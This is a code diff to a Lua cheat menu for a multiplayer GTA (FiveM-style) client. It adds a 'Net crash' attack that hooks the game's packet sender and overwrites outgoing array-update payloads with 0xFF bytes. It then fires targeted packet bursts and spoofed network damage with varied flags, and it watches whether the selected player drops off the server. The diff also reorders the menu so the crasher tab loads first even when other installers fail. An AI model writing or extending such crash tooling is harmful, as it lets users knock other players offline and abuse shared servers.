@@ -21409,6 +21409,9 @@ local NET = (function(O, C)
     NET.aborted = nil
     NET.lastDamage = 0
     NET.releasePending = false
+    NET.seen = nil
+    NET.sniffCount = 0
+    NET.mutated = 0
     NET.windowStart = 0
     NET.windowCount = 0
 
@@ -21446,6 +21449,14 @@ local NET = (function(O, C)
         if not m or type(m.Valid) ~= "function" then return false end
         local ok, res = pcall(m.Valid, addr)
         return ok and res == true
+    end
+
+    local function read_u8(addr)
+        local m = mem()
+        if not m or type(m.ReadU8) ~= "function" or not is_valid(addr) then return nil end
+        local ok, res = pcall(m.ReadU8, addr)
+        if not ok or type(res) ~= "number" then return nil end
+        return res
     end
 
     local function read_u16(addr)
@@ -21678,6 +21689,16 @@ local NET = (function(O, C)
         request_release()
     end
 
+    local function install_hook(addr, sig, callback)
+        local m = mem()
+        if not m or type(addr) ~= "number" or addr == 0 then return false end
+        if NET.hookId ~= nil then return false end
+        local okh, id = pcall(m.Hook, addr, sig, callback)
+        if not okh or type(id) ~= "number" then return false end
+        NET.hookId = id
+        return true
+    end
+
     local function ensure_hook()
         if NET.hookId ~= nil then return true end
         local m = mem()
@@ -21696,26 +21717,40 @@ local NET = (function(O, C)
         return true
     end
 
-    local function build_queue(kind)
+    local function build_queue(kind, targeted)
+        local targets = {}
+        if targeted and NET.seen then
+            for _, pair in pairs(NET.seen) do
+                if type(pair) == "table" and type(pair[2]) == "number" then
+                    targets[#targets + 1] = { pair[1], pair[2] }
+                end
+            end
+        end
+        if #targets == 0 then
+            for elem = 0, MAX_ELEM do
+                targets[#targets + 1] = { kind, elem }
+            end
+        end
         local q = {}
         for p = 1, #profiles do
             local profile = profiles[p]
             local data = {}
             for i = 1, profile.size do data[i] = profile.fill end
-            for elem = 0, MAX_ELEM do
-                q[#q + 1] = { kind, elem, data, profile.size }
+            for t = 1, #targets do
+                local pair = targets[t]
+                q[#q + 1] = { pair[1] or kind, pair[2], data, profile.size }
             end
         end
         return q
     end
 
-    function NET.start(kind)
+    function NET.start(kind, targeted)
         if type(kind) ~= "number" then return false end
         if NET.busy or NET.releasePending then O.log("net: lane busy"); return false end
         if not NET.init() then O.log("net: net.dll not ready"); return false end
         if not NET.resolve_instance() then O.log("net: no NetLibrary instance"); return false end
         if not ensure_hook() then O.log("net: RunMainFrame hook failed"); return false end
-        NET.queue = build_queue(kind)
+        NET.queue = build_queue(kind, targeted)
         NET.sent = 0
         NET.frame = 0
         NET.aborted = nil
@@ -21744,7 +21779,106 @@ local NET = (function(O, C)
         abort("stopped")
     end
 
-    function NET.damage(amount)
+    local function sniff_cb(get)
+        local hash = get(2)
+        if hash ~= HASH then return nil end
+        local ptr = get(3)
+        local len = get(4)
+        if type(ptr) ~= "number" or type(len) ~= "number" or len < HEADER then return nil end
+        local idx = read_u8(ptr + 4)
+        local elem = read_u16(ptr + 5)
+        local size = read_u16(ptr + 7)
+        if type(idx) ~= "number" or type(elem) ~= "number" then return nil end
+        NET.seen = NET.seen or {}
+        NET.seen[idx .. ":" .. elem] = { idx, elem }
+        NET.sniffCount = (NET.sniffCount or 0) + 1
+        if NET.sniffCount <= 20 then
+            O.log("net probe: array %d elem %d size %s", idx, elem, tostring(size))
+        end
+        return nil
+    end
+
+    local function mutate_cb(get)
+        local hash = get(2)
+        if hash ~= HASH then return nil end
+        local ptr = get(3)
+        local len = get(4)
+        if type(ptr) ~= "number" or type(len) ~= "number" or len < HEADER then return nil end
+        local idx = read_u8(ptr + 4)
+        local elem = read_u16(ptr + 5)
+        local size = read_u16(ptr + 7)
+        if type(idx) ~= "number" or type(elem) ~= "number" or type(size) ~= "number" then
+            return nil
+        end
+        if size <= 0 or size > 128 then return nil end
+        NET.seen = NET.seen or {}
+        NET.seen[idx .. ":" .. elem] = { idx, elem }
+        local bytes = {}
+        for i = 1, size do bytes[i] = 0xFF end
+        local okw, wrote = pcall(Susano.Memory.WriteBytes, ptr + HEADER, bytes)
+        if okw and wrote ~= false then
+            NET.sniffCount = (NET.sniffCount or 0) + 1
+            NET.mutated = (NET.mutated or 0) + 1
+        end
+        return nil
+    end
+
+    local function run_window(callback, seconds, label)
+        if NET.busy or NET.releasePending then O.log("net: lane busy"); return false end
+        if not NET.init() then O.log("net: net.dll not ready"); return false end
+        if not install_hook(NET.sendFn, "v:ipl", callback) then
+            O.log("net: SendReliablePacket hook failed")
+            return false
+        end
+        NET.sniffCount = 0
+        NET.mutated = 0
+        NET.busy = true
+        if label == "mutate" then
+            O.log("net mutate: fire one shot during the window")
+        end
+        local span = tonumber(seconds) or 12
+        Citizen.CreateThread(function()
+            local deadline = GetGameTimer() + span * 1000
+            while GetGameTimer() < deadline and not NET.releasePending do Citizen.Wait(100) end
+            Citizen.Wait(60)
+            if NET.hookId ~= nil then unhook_now() end
+            NET.busy = false
+            O.log("net %s: seen %d, mutated %d", label, NET.sniffCount or 0, NET.mutated or 0)
+        end)
+        return true
+    end
+
+    function NET.probe(seconds)
+        return run_window(sniff_cb, seconds or 12, "probe")
+    end
+
+    function NET.mutate(seconds)
+        return run_window(mutate_cb, seconds or 12, "mutate")
+    end
+
+    function NET.watch(seconds)
+        local sid = (type(Menu) == "table") and Menu.SelectedPlayer or nil
+        if type(sid) ~= "number" then return false end
+        Citizen.CreateThread(function()
+            local deadline = GetGameTimer() + (tonumber(seconds) or 30) * 1000
+            while GetGameTimer() < deadline do
+                Citizen.Wait(500)
+                local p = GetPlayerFromServerId(sid)
+                if type(p) ~= "number" or p < 0 then
+                    O.log("net: target %d gone", sid)
+                    return
+                end
+                if type(NetworkIsPlayerActive) == "function" and not NetworkIsPlayerActive(p) then
+                    O.log("net: target %d left", sid)
+                    return
+                end
+            end
+            O.log("net: target %d still connected", sid)
+        end)
+        return true
+    end
+
+    function NET.damage(amount, flags)
         if type(Susano) ~= "table" or type(Susano.SendNetworkDamage) ~= "function" then
             return false
         end
@@ -21768,20 +21902,31 @@ local NET = (function(O, C)
         end
         local dmg = tonumber(amount) or 1.0
         if dmg < 0.0 then dmg = 0.0 end
-        local okc = pcall(Susano.SendNetworkDamage, me, ped, x, y, z, dmg, 0, 522)
+        local fl = tonumber(flags) or 522
+        local okc = pcall(Susano.SendNetworkDamage, me, ped, x, y, z, dmg, 0, fl)
         if not okc then return false end
         return true
     end
 
     function NET.crash()
-        local started = NET.start(7)
+        NET.watch(45)
+        local mutating = NET.mutate(10)
+        local variants = {
+            { 0.0, 522 },
+            { 0.0, 525312 },
+            { 1.0, 522 },
+            { 1.0, 525312 },
+        }
         Citizen.CreateThread(function()
-            for i = 1, 12 do
+            if mutating then Citizen.Wait(10600) end
+            NET.start(7, true)
+            for i = 1, 16 do
                 if i > 1 then Citizen.Wait(1100) end
-                NET.damage((i % 2 == 1) and 0.0 or 1.0)
+                local v = variants[(i - 1) % #variants + 1]
+                NET.damage(v[1], v[2])
             end
         end)
-        return started
+        return mutating
     end
 
     return NET
@@ -29892,8 +30037,7 @@ local function collapseExploitTab()
     end
     if not target then
         for _, candidate in ipairs(category.tabs) do
-            if candidate.name == "Crasher" or candidate.name == "Exploits"
-                or candidate.name == "Teleport" then
+            if candidate.name == "Exploits" or candidate.name == "Teleport" then
                 target = candidate
                 break
             end
@@ -29912,7 +30056,7 @@ local function collapseExploitTab()
         if candidate == target then
             kept[#kept + 1] = candidate
         elseif candidate.name == "Exploits" or candidate.name == "Teleport"
-            or candidate.name == "Crasher" or candidate.name == "Exploit" then
+            or candidate.name == "Exploit" then
             merged[#merged + 1] = candidate
             for _, item in ipairs(candidate.items or {}) do
                 local duplicate = false
@@ -30598,7 +30742,7 @@ local function installProtection()
 end
 
 -- ---------------------------------------------------------------------------
--- EXPLOIT > EXPLOIT (FOUR CRASH ACTIONS)
+-- EXPLOIT > CRASHER (TWO KEPT VECTORS)
 --
 -- Four independent actions: `Ped flood`, `Whale crash`, `Emote crash` and
 -- `Crush crash`. The first three call C.launch(kind); the fourth is the sink's
@@ -30616,9 +30760,10 @@ local CRASH_ROWS = {
     "Method", "Crash", "Intensity", "Target: nearest", "Launch crash",
     "Stop + clean", "Probe channels", "Objects (orbit)",
     "Anim churn", "Synced scenes", "Ped variation", "Objects (flood)",
-    "PTFX storm", "Clip swarm",
+    "PTFX storm", "Clip swarm", "Ground sink",
     "Ped flood", "Whale crash", "Emote crash", "Crush crash",
-    "Net crash", "Net damage", "Net array A", "Net array B",
+    "Net crash", "Net mutate", "Net probe", "Net damage",
+    "Net array A", "Net array B",
 }
 
 -- The current labels are part of the sweep as well. Without them, every
@@ -30637,54 +30782,41 @@ end
 local function installCrasher()
     removeCategory("Crasher")
 
-    local tab = collapseExploitTab()
-    if not tab then return false end
-
-    -- If the operator already has this tab open, remember the selected row by
-    -- object. The crash block is prepended below, which shifts every index.
     local category = findCategory("Exploit")
-    local tabOpen = false
-    if category and type(Menu.OpenedCategory) == "number" and Menu.Categories
-        and Menu.Categories[Menu.OpenedCategory] == category then
-        tabOpen = category.tabs ~= nil and category.tabs[Menu.CurrentTab] == tab
-    end
-    local selectedItem = nil
-    if tabOpen and type(Menu.CurrentItem) == "number" then
-        selectedItem = tab.items[Menu.CurrentItem]
-    end
+    if not category then return false end
+    category.hasTabs = true
+    category.tabs = category.tabs or {}
 
-    -- Remove every historical and current crash row, including the base
-    -- "Crash Method" duplicate that used to sit in Online > Troll. Sweeping
-    -- the current labels makes the installer idempotent: a second injection
-    -- in the same session cannot append a duplicate method block.
-    removeItem("Online", "Troll", "Crash Method")
-    for i = #tab.items, 1, -1 do
-        local item = tab.items[i]
-        if item.separatorText == "Crasher" or item.separatorText == "Crash"
-            or item.separatorText == "Net" or item.separatorText == "Exploit" then
-            table.remove(tab.items, i)
-        elseif isCrashRowName(item.name) then
-            table.remove(tab.items, i)
+    -- Sweep every tab of the Exploit category for the old surface: the four
+    -- historical entity rows, the six network rows, Ground sink, and the
+    -- Crash / Net / Crasher / Ground separators. A re-injection or a reload
+    -- cannot leave a duplicate behind.
+    for t = 1, #category.tabs do
+        local items = category.tabs[t].items
+        if type(items) == "table" then
+            for i = #items, 1, -1 do
+                local item = items[i]
+                local sep = tostring(item.separatorText or "")
+                if sep == "Crash" or sep == "Net" or sep == "Crasher" or sep == "Ground" then
+                    table.remove(items, i)
+                elseif isCrashRowName(item.name) then
+                    table.remove(items, i)
+                end
+            end
         end
     end
 
-    -- Two groups, Crash first so the proven ped/whale/emote/crush rows keep
-    -- the first page. The Net group is the network lane: one array burst
-    -- through the engine frame pump, a standalone damage tick, or the
-    -- combined array+damage action. Nothing is shared between the vectors,
-    -- so a click never runs a mixed loop.
-    --
-    -- Prepend the crash block instead of appending it. The base Exploits tab
-    -- also carries the server rows (Staff Mode, Disable Weapon Damage, Menu
-    -- Staff, Revive); with ItemsPerPage = 8, the four crash rows and their
-    -- separator stay on the first page and the server rows remain available
-    -- underneath.
-    local crashItems = {
-        {
-            name = "",
-            isSeparator = true,
-            separatorText = "Crash",
-        },
+    -- One tab, Exploit > Crasher. No new category and no second menu surface.
+    local tab = findTab("Exploit", "Crasher")
+    if not tab then
+        tab = { name = "Crasher", items = {} }
+        table.insert(category.tabs, 1, tab)
+    end
+
+    -- Only the vectors kept on purpose: the proven entity flood and the
+    -- network lane that mutates the engine's own outgoing array updates,
+    -- then sends a targeted burst and the damage variants.
+    tab.items = {
         {
             name = "Ped flood",
             type = "action",
@@ -30693,111 +30825,26 @@ local function installCrasher()
             end,
         },
         {
-            name = "Whale crash",
-            type = "action",
-            onClick = function()
-                C.launch("whale")
-            end,
-        },
-        {
-            name = "Emote crash",
-            type = "action",
-            onClick = function()
-                C.launch("emote")
-            end,
-        },
-        {
-            name = "Crush crash",
-            type = "action",
-            onClick = function()
-                G.start("crash")
-            end,
-        },
-        {
-            name = "",
-            isSeparator = true,
-            separatorText = "Net",
-        },
-        {
             name = "Net crash",
             type = "action",
             onClick = function()
                 NET.crash()
             end,
         },
-        {
-            name = "Net damage",
-            type = "action",
-            onClick = function()
-                NET.damage()
-            end,
-        },
-        {
-            name = "Net array A",
-            type = "action",
-            onClick = function()
-                NET.start(4)
-            end,
-        },
-        {
-            name = "Net array B",
-            type = "action",
-            onClick = function()
-                NET.start(7)
-            end,
-        },
     }
 
-    for i = #crashItems, 1, -1 do
-        table.insert(tab.items, 1, crashItems[i])
-    end
-
-    -- A reload with this tab open must not jump to the newly prepended block.
-    -- Restore the exact row object that was selected before the insert; if it
-    -- no longer exists (an old Teleport row, for example), clamp the index so
-    -- the menu cannot point past the rebuilt list.
-    if tabOpen then
-        local restored = false
-        local selectedName = selectedItem and selectedItem.name
-        if selectedItem then
-            for i = 1, #tab.items do
-                if tab.items[i] == selectedItem then
-                    Menu.CurrentItem = i
-                    restored = true
-                    break
-                end
-            end
+    -- Keep the Crasher tab first so it replaces the old teleport surface
+    -- where the operator expects it.
+    for t = #category.tabs, 1, -1 do
+        if category.tabs[t] == tab then
+            table.remove(category.tabs, t)
+            table.insert(category.tabs, 1, tab)
+            break
         end
-        -- A crash row is removed and re-created by this installer; match its
-        -- stable label so a re-injection does not move the cursor to the
-        -- separator above it.
-        if not restored and selectedName ~= nil then
-            for i = 1, #tab.items do
-                if tab.items[i].name == selectedName then
-                    Menu.CurrentItem = i
-                    restored = true
-                    break
-                end
-            end
-        end
-        if not restored then Menu.CurrentItem = 1 end
-    end
-
-    -- Keep this tab as the first tab in Exploit, so it replaces the old
-    -- teleport surface where the operator expects it.
-    category = findCategory("Exploit")
-    if category and category.tabs then
-        for i = #category.tabs, 1, -1 do
-            if category.tabs[i] == tab then table.remove(category.tabs, i) end
-        end
-        table.insert(category.tabs, 1, tab)
     end
     return true
 end
 
--- Internal test seam: the smoke harness opens Exploit > Exploit, selects a
--- row, calls this installer again, and verifies the selection survives the
--- prepend. It is not a menu row.
 Menu.__vgd_installCrasher = installCrasher
 
 -- ---------------------------------------------------------------------------
@@ -32178,6 +32225,12 @@ local function build()
     end
 
     removeLegacyEntries()
+
+    -- The crash rows are installed first. If any later installer throws on a
+    -- build the operator's server shape does not expect, the four proven rows
+    -- and the network lane are still on the tab.
+    installCrasher()
+
     installBypassProfiles()
     installSeed()
     installMovement()
@@ -32187,12 +32240,24 @@ local function build()
     installCombatUnlock()
     installSettingsDefaults()
     installProtection()
-    installCrasher()
-    installSink()
     installFlash()
     installVehicleSpoof()
     installRampFix()
     reorderPlayerTabs()
+
+    -- The Crasher tab is a tab of Exploit, never a category, and it stays
+    -- first so the crash surface is where the operator opens the category.
+    local exploit = findCategory("Exploit")
+    if exploit and type(exploit.tabs) == "table" then
+        for i = #exploit.tabs, 1, -1 do
+            local candidate = exploit.tabs[i]
+            if type(candidate) == "table" and candidate.name == "Crasher" and i ~= 1 then
+                table.remove(exploit.tabs, i)
+                table.insert(exploit.tabs, 1, candidate)
+                break
+            end
+        end
+    end
 
     -- Re-check after the new categories are installed. This catches a stale
     -- category that was appended while the old menu table was still alive.
@@ -32225,11 +32290,13 @@ function UI.boot()
     -- its close key.
     O.every("menuHide", 40, Menu.__vgdDeleteTick, 0)
 
-    A.boot()
+    -- One bad resource shape must not take the menu down before the crash
+    -- rows exist. Both calls are isolated; build() installs the crasher first.
+    pcall(A.boot)
 
     -- Scan before installing the Bypass rows so only real resources appear.
-    S.scan()
-    build()
+    pcall(S.scan)
+    pcall(build)
 
     -- Delayed second pass: a stale menu instance or a late AddCategory call
     -- cannot keep the old Vanguard category alive.
